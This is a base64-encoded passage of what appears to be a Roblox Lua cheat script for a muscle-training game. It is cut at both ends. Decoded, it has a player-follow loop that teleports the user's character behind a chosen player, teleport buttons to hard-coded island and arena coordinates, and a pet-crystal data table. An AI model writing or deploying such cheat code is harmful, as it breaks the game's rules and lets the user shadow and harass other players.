LSBJbW1lZGlhdGUgVFAgd2hlbiBzZWxlY3RlZAogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gZm9sbG93UGxheWVyKHRhcmdldFBsYXllcikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcgoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgKG15Q2hhciBhbmQgdGFyZ2V0Q2hhcikgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlIUlAgPSBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldEhSUCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgICAgICAgICAgICAgICAgICBpZiBteUhSUCBhbmQgdGFyZ2V0SFJQIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZm9sbG93UG9zID0gdGFyZ2V0SFJQLlBvc2l0aW9uIC0gKHRhcmdldEhSUC5DRnJhbWUuTG9va1ZlY3RvciAqIDMpCiAgICAgICAgICAgICAgICAgICAgICAgIG15SFJQLkNGcmFtZSA9IENGcmFtZS5uZXcoZm9sbG93UG9zLCB0YXJnZXRIUlAuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9sbG93UGxheWVyKHRhcmdldCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFBvcHVsYXRlIGZvbGxvdyBkcm9wZG93bgpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgZm9sbG93RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgZm9sbG93RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBmb2xsb3dEcm9wZG93bjpDbGVhcigpCiAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwbHIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICBmb2xsb3dEcm9wZG93bjpBZGQocGxyLk5hbWUpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGlmIGZvbGxvd1RhcmdldCA9PSBwbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgZm9sbG93VGFyZ2V0ID0gbmlsCiAgICAgICAgZm9sbG93aW5nID0gZmFsc2UKICAgIGVuZAplbmQpCgpLaWxsc1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiVW5mb2xsb3ciLAogICAgRGVzYyA9ICJTdG9wIGZvbGxvd2luZyBjdXJyZW50IHRhcmdldCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBmb2xsb3dpbmcgPSBmYWxzZQogICAgICAgIGZvbGxvd1RhcmdldCA9IG5pbAogICAgZW5kCn0pCgotLSBGb2xsb3cgbG9vcAp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGlmIGZvbGxvd2luZyBhbmQgZm9sbG93VGFyZ2V0IHRoZW4KICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChmb2xsb3dUYXJnZXQpCiAgICAgICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBmb2xsb3dQbGF5ZXIodGFyZ2V0UGxheWVyKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldENoYXIgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCAobXlDaGFyIGFuZCB0YXJnZXRDaGFyKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBteUhSUCA9IG15Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SFJQID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgICAgICAgICAgICAgICAgIGlmIG15SFJQIGFuZCB0YXJnZXRIUlAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmb2xsb3dQb3MgPSB0YXJnZXRIUlAuUG9zaXRpb24gLSAodGFyZ2V0SFJQLkNGcmFtZS5Mb29rVmVjdG9yICogMykKICAgICAgICAgICAgICAgICAgICAgICAgbXlIUlAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhmb2xsb3dQb3MsIHRhcmdldEhSUC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb2xsb3dQbGF5ZXIodGFyZ2V0KQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBmb2xsb3dpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgZm9sbG93VGFyZ2V0ID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0tIFRlbGVwb3J0IFRhYgpsb2NhbCBUZWxlcG9ydFRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlRlbGVwb3J0IiwgSWNvbiA9ICJtYXAtcGluIn0pCgotLSBJc2xhbmRzIFNlY3Rpb24KVGVsZXBvcnRUYWI6U2VjdGlvbih7VGl0bGUgPSAiSXNsYW5kcyJ9KQoKVGVsZXBvcnRUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIlNwYXduIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gU3Bhd24iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygyLCA4LCAxMTUpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIFNwYXduIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiU2VjcmV0IEFyZWEiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBTZWNyZXQgQXJlYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDE5NDcsIDIsIDYxOTEpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIFNlY3JldCBBcmVhIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiVGlueSBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBUaW55IElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC0zNCwgNywgMTkwMykKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gVGlueSBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJGcm96ZW4gSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gRnJvemVuIElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC0yNjAwLjAwMjQ0LCAzLjY3Njg2NTU4LCAtNDAzLjg4NDM2OSwgMC4wODczNjE3MDA4LCAxLjA0ODI4OTllLTA5LCAwLjk5NjE3NjY2LCAzLjA3MjA0MjUzZS0wOCwgMSwgLTMuNzQ2NDAyM2UtMDksIC0wLjk5NjE3NjY2LCAzLjA5MzAyNjI4ZS0wOCwgMC4wODczNjE3MDA4KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBGcm96ZW4gSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiTXl0aGljYWwgSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gTXl0aGljYWwgSXNsYW5kIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMjI1NSwgNywgMTA3MSkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gTXl0aGljYWwgSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiSW5mZXJubyBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBJbmZlcm5vIElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC02NzY4LCA3LCAtMTI4NykKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gSW5mZXJubyBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJMZWdlbmQgSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gTGVnZW5kIElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDQ2MDQsIDk5MSwgLTM4ODcpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIExlZ2VuZCBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJNdXNjbGUgS2luZyBJc2xhbmQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBNdXNjbGUgS2luZyBJc2xhbmQiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtODY0NiwgMTcsIC01NzM4KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBNdXNjbGUgS2luZyBJc2xhbmQiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJKdW5nbGUgSXNsYW5kIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gSnVuZ2xlIElzbGFuZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC04NjU5LCA2LCAyMzg0KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBKdW5nbGUgSXNsYW5kIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgotLSBCcmF3bCBBcmVuYXMgU2VjdGlvbgpUZWxlcG9ydFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJCcmF3bCBBcmVuYXMifSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJCcmF3bCBMYXZhIiwKICAgIERlc2MgPSAiVGVsZXBvcnQgdG8gTGF2YSBCcmF3bCBBcmVuYSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDQ0NzEsIDExOSwgLTg4MzYpCiAgICAgICAgCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlRlbGV0cmFuc3BvcnRlIiwKICAgICAgICAgICAgRGVzYyA9ICJUZWxlcG9ydGVkIHRvIEJyYXdsIExhdmEiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKClRlbGVwb3J0VGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJCcmF3bCBEZXNlcnQiLAogICAgRGVzYyA9ICJUZWxlcG9ydCB0byBEZXNlcnQgQnJhd2wgQXJlbmEiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5NjAsIDE3LCAtNzM5OCkKICAgICAgICAKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiVGVsZXRyYW5zcG9ydGUiLAogICAgICAgICAgICBEZXNjID0gIlRlbGVwb3J0ZWQgdG8gQnJhd2wgRGVzZXJ0IiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpUZWxlcG9ydFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiQnJhd2wgUmVndWxhciIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIFJlZ3VsYXIgQnJhd2wgQXJlbmEiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMTg0OSwgMjAsIC02MzM1KQogICAgICAgIAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJUZWxldHJhbnNwb3J0ZSIsCiAgICAgICAgICAgIERlc2MgPSAiVGVsZXBvcnRlZCB0byBCcmF3bCBSZWd1bGFyIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgotLSBQZXQgU2hvcCBUYWIKbG9jYWwgUGV0U2hvcFRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlBldCBTaG9wIiwgSWNvbiA9ICJzaG9wcGluZy1iYWcifSkKCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgotLSBDcnlzdGFsIGRhdGEgc3RydWN0dXJlCmxvY2FsIGNyeXN0YWxEYXRhID0gewogICAgWyJCbHVlIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJCbHVlIEJpcmRpZSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIk9yYW5nZSBIZWRnZWhvZyIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBLaXR0eSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgVmFtcHkiLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEJ1bm55IiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJSZWQgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlllbGxvdyBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0KICAgIH0sCiAgICBbIkdyZWVuIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJTaWx2ZXIgRG9nIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiR3JlZW4gQXVyYSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgR29sZW0iLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBCdXR0ZXJmbHkiLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJDcmltc29uIEZhbGNvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJSZWQgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlllbGxvdyBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0KICAgIH0sCiAgICBbIkZyb3N0IENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJZZWxsb3cgQnV0dGVyZmx5IiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIERyYWdvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJPcmFuZ2UgUGVnYXN1cyIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiTGlnaHRuaW5nIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJFbGVjdHJvIiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0KICAgIH0sCiAgICBbIk15dGhpY2FsIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJQdXJwbGUgRmFsY29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJSZWQgRHJhZ29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEZpcmVjYXN0ZXIiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkdvbGRlbiBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJQb3dlciBMaWdodG5pbmciLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgTGlnaHRuaW5nIiwgcmFyaXR5ID0gIkVwaWMifQogICAgfSwKICAgIFsiSW5mZXJubyBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiUmVkIEZpcmVjYXN0ZXIiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkluZmVybmFsIERyYWdvbiIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJXaGl0ZSBQZWdhc3VzIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJHb2xkZW4gUGhlb25peCIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiSW5mZXJubyIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBTdG9ybSIsIHJhcml0eSA9ICJVbmlxdWUifQogICAgfSwKICAgIFsiTGVnZW5kcyBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiVWx0cmEgQmlyZGllIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIk1hZ2